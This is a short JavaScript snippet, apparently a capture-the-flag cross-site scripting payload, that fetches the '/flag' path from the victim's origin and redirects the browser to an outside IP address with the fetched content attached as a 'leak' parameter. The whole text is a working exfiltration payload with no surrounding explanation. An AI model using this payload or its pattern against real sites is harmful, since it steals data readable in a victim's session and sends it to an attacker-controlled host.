     fetch('/flag')
       .then(r => r.text())
       .then(flag => {
         location = 'http://111.229.198.6/leak?flag=' + encodeURIComponent(flag)
       })
